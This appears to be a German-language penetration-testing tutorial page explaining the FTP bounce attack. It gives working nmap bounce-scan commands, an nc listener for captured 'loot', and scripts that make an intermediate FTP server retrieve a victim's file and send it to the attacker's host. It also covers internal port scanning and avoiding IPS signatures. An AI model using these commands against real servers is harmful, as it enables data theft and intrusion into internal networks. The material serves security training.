# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Zusammenfassung

Wenn du Zugriff auf einen **FTP Bounce Server** hast, kannst du ihn dazu bringen, Dateien von einem **anderen FTP-Server** (bei dem du einige Zugangsdaten kennst) anzufordern und diese Datei auf **deinen eigenen Server** herunterzuladen.

## Voraussetzungen

- Gültige FTP-Zugangsdaten auf dem **FTP-Zwischenserver**
- Gültige FTP-Zugangsdaten auf dem **Opfer-FTP-Server**
- Beide Server **akzeptieren den `PORT`-Befehl** (bounce FTP attack)
- Du kannst in einem Verzeichnis des **FTP-Zwischenservers** **schreiben**
- Der Zwischenserver hat **mehr Zugriff** auf den Opfer-FTP-Server als du

## Schritte

1. Verbinde dich mit **deinem eigenen FTP-Server** und setzte die Verbindung auf passive Mode (`pasv`-Befehl), sodass er in einem Verzeichnis **lauscht**, in das der Opfer-Service die Datei senden wird.
2. Erstelle die Datei, die der FTP-Zwischenserver an den Opfer-Server senden wird (das **exploit script**). Diese Datei ist Plaintext mit den notwendigen Befehlen, um sich beim Opfer-Server zu authentifizieren, das Verzeichnis zu wechseln und eine Datei auf deinen eigenen Server herunterzuladen.
3. Verbinde dich mit dem **FTP-Zwischenserver** und lade die vorherige Datei hoch.
4. Lasse den FTP-Zwischenserver eine Verbindung mit dem Opfer-Server **aufbauen** und das exploit script senden.
5. **Fange** die Datei auf deinem eigenen FTP-Server ab.
6. **Lösche** die exploit-Datei vom FTP-Zwischenserver.

## Schneller Check für verwundbare Bounce-Hosts

- **Nmap** unterstützt weiterhin FTP Bounce-Checks. Beispiel, um einen potenziellen Zwischenserver zu überprüfen:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Wenn der Server Drittanbieter-`PORT`-Werte ablehnt, schlägt der Scan fehl; einige eingebettete/ältere Drucker, NAS und Appliance-FTP-Daemons erlauben es immer noch.

## Automatisierung des 2. FTP-Downloads

Nachfolgend eine modernisierte Methode, um eine Datei über einen verwundbaren mittleren FTP-Server zu beziehen.

1. **Öffne einen passiven Listener** auf deinem Angreifer-Rechner (jeder TCP-Sink funktioniert):
```bash
nc -lvnp 2121 > loot.bin  # oder starte einen kleinen pyftpdlib-Server
```

2. **Notiere** deine IP als `A,B,C,D` und den Port `P` als `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Erstelle die Instruktionsdatei**, die der mittlere Server gegenüber dem Opfer abspielen wird:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Hochladen & Auslösen vom mittleren Server** (klassisches proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Hole die Datei** von deinem Listener (`loot.bin`).
6. **Bereinige** die hochgeladene `instrs`-Datei auf dem mittleren Server.

Hinweise:
- Padding (`dd ...`) verhindert, dass die Steuerverbindung geschlossen wird, bevor der RETR fertig ist (Problem mit großem TCP-Fenster, in klassischen Writeups besprochen).
- Jeder Dienst, der **listen and dump TCP** kann, kann den FTP PASV-Socket ersetzen (z. B. `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Falls der mittlere Server privilegierte Ports einschränkt, verwende einen hohen Port in `PORT` und passe deinen Listener entsprechend an.

## Zusätzliche Tricks

- Verwende einen bouncefähigen FTP-Server, um **port-scan internal hosts** durchzuführen, wenn File-Relay blockiert ist:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Manche modernen WAF/IDS (z. B. Juniper IPS) liefern Signaturen speziell für **FTP:EXPLOIT:BOUNCE-ATTACK**; laute Payloads oder fehlendes Padding können diese auslösen.
- Wenn der mittlere Server "PORT to same host"-Einschränkungen durchsetzt, platziere deinen **listener on the middle server itself** (falls du Schreib-/Ausführrechte hast) und leite die erfasste Datei später weiter.

Für einen detaillierteren Old‑School-Walkthrough siehe: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
